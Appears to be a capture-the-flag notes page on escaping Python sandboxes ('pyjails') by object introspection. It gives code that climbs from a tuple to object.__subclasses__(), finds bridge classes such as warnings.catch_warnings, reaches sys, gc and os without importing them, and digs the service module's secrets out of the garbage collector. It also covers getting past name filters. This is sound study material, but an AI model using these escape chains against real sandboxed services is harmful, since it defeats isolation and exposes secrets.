---
title: "03 — Object Introspection (subclass traversal)"
date: 2026-10-31
categories: [python-jail]
tags: [pyjail, python, security]
---
# 03 — Object Introspection (subclass traversal)

The classic pyjail escape: start from a harmless object, reach `object`,
enumerate subclasses, find a pure-Python class whose globals contain a real
module.

## The chain

```python
().__class__                 # <type 'tuple'> / <class 'tuple'>
().__class__.__base__        # <type 'object'> / <class 'object'>
().__class__.__base__.__subclasses__()   # list of all loaded subclasses
```

In Python 3 you can also write `object.__subclasses__()` directly if `object`
is nameable.

## Finding a bridge class

You need a subclass whose `__init__` (or another method) is pure Python, so
its `__globals__`/`func_globals` is a real module namespace:

```python
subs = ().__class__.__base__.__subclasses__()
for i, c in enumerate(subs):
    try:
        g = c.__init__.__globals__   # Py3
    except Exception:
        try:
            g = c.__init__.im_func.__globals__   # Py2
        except Exception:
            g = None
    if g and "sys" in g:
        print(i, c, "has sys")
```

Typical bridges:
- `warnings.catch_warnings` — its `__init__` globals include `warnings`, and
  through it `linecache`, and through `linecache.__dict__` the `os` module.
- Other classes may expose `sys` directly.

**Never hardcode the index.** `python_jail_exec` uses index 59;
`python_jail_garbage_collector` uses 71. These differ by build and import
order. Always print candidates first.

## From `sys` to `gc`

```python
sysmod = g["sys"]                       # or g.get("sys")
gcmod = sysmod.modules["gc"]            # real gc, even if name removed
```

This works even when the jail deleted `gc` from its own globals, because
`sys.modules` is the import cache of the real interpreter.

## From `gc` to the service module

The service module object is still alive and tracked by the GC even after its
name is removed from `sys.modules`:

```python
objs = gcmod.get_objects()
mainmod = [m for m in objs
           if type(m).__name__ == "module"
           and getattr(m, "__file__", None) == "/path/to/service.py"][0]
```

`mainmod.__dict__` then exposes `os`, `sys`, `gc`, `orig_builtins`,
`remove_builtins`, `sanitize`, `get_your_keys`, etc.

This is the core of `python_jail_garbage_collector`.

## From `warnings` to `os` (shorter chain)

```python
subs = ().__class__.__base__.__subclasses__()
# find warnings.catch_warnings index by searching
for i, c in enumerate(subs):
    if "catch_warnings" in repr(c):
        w = subs[i]
# warnings module globals
g = w.__init__.__globals__          # Py3: w.__init__.__wrapped__? check
# in Py2: w.__init__.im_func.__globals__
lc = g.get("linecache")             # linecache module
osm = lc.__dict__.get("os")         # os module
```

`python_jail_exec` uses this to get `os.open`/`os.read` without `import`.

## When `__subclasses__` itself is blocked

- By name filter on `__subclasses__`: use formatting
  `"{0.__class__.__base__.__subclasses__}".format(())` (text only), or reach
  `object` via a different pure-Python object you can name.
- By truncation: stage across evaluations (see `06-filter-bypass.md`).
- By removing `object`: try other roots — `str`, `int`, `list`, `dict`,
  `tuple`, `type`, `BaseException`, `Exception`. Their `__subclasses__`/
  `__mro__` can also bridge.

## Searching robustly

Always prefer search loops over magic numbers:

```python
def find_with_attr(subs, attr, key=None):
    for i, c in enumerate(subs):
        try:
            val = getattr(c, attr, None)
            if val is not None and (key is None or key in getattr(val, "__globals__", {})):
                return i, c
        except Exception:
            pass
    return None
```

## Environment-specific values (from this repo)

| Challenge | Bridge | Index/value |
|---|---|---|
| `python_jail_exec` | `warnings.catch_warnings` | subclass index 59 (Py2) |
| `python_jail_garbage_collector` | `warnings.catch_warnings` | subclass index 71 (Py2.7) |
| `python_jail_garbage_collector` | service module | found via `__file__ == /challenge/app-script/ch15/ch15.py` |

Treat these as examples, not constants.

## Caveats

- `__subclasses__()` returns direct subclasses of `object`; a class must
  already be imported somewhere in the process to appear.
- Indices change with Python version, build, and import order.
- Some builds scrub `__globals__` on certain classes; try several bridge
  candidates.
- `im_func` is Py2-only; Py3 puts `__func__` on bound methods or just uses
  the function directly.

